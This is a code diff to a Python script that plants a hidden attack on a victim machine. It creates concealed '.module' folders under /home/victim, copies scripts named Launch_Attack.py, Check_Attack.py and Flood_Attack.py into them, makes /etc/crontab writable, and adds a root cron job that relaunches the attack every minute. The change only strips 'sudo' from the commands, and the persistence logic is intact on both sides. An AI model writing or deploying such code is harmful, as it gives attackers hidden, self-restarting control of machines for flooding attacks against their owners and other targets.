@@ -4,13 +4,13 @@ import sys
 
 attackDirs = ['/home/victim/.etc', '/home/victim/.var']
 attackFiles = ['/Launch_Attack.py', '/Check_Attack.py', '/Flood_Attack.py']
-attackCommand = '* * * * * root sudo /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py || (sudo /usr/bin/python /home/victim/.var/.module/Launch_Attack.py)'
+attackCommand = '* * * * * root /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py || (/usr/bin/python /home/victim/.var/.module/Launch_Attack.py)'
 
 
 def set_up_crontab():
 
     # Write Crontab
-    os.system('sudo chmod +w /etc/crontab')
+    os.system('chmod +w /etc/crontab')
 
     crontab = open('/etc/crontab', 'a')
 
@@ -24,11 +24,11 @@ def set_up_attack():
 
     # Make directories
     for attackDir in attackDirs:
-        os.system('sudo mkdir {0}'.format(attackDir))
-        os.system('sudo mkdir {0}/.module'.format(attackDir))
-        os.system('sudo cp a.py {0}/.module/Launch_Attack.py'.format(attackDir))
-        os.system('sudo cp b.py {0}/.module/Check_Attack.py'.format(attackDir))
-        os.system('sudo cp c.py {0}/.module/Flood_Attack.py'.format(attackDir))
+        os.system('mkdir {0}'.format(attackDir))
+        os.system('mkdir {0}/.module'.format(attackDir))
+        os.system('cp a.py {0}/.module/Launch_Attack.py'.format(attackDir))
+        os.system('cp b.py {0}/.module/Check_Attack.py'.format(attackDir))
+        os.system('cp c.py {0}/.module/Flood_Attack.py'.format(attackDir))
 
 
 def is_set_up_attack():
@@ -42,7 +42,7 @@ def is_set_up_attack():
 
 def is_set_up_crontab():
     # Read Crontab
-    os.system('sudo chmod +r /etc/crontab')
+    os.system('chmod +r /etc/crontab')
 
     crontab = open('/etc/crontab', 'r')
 
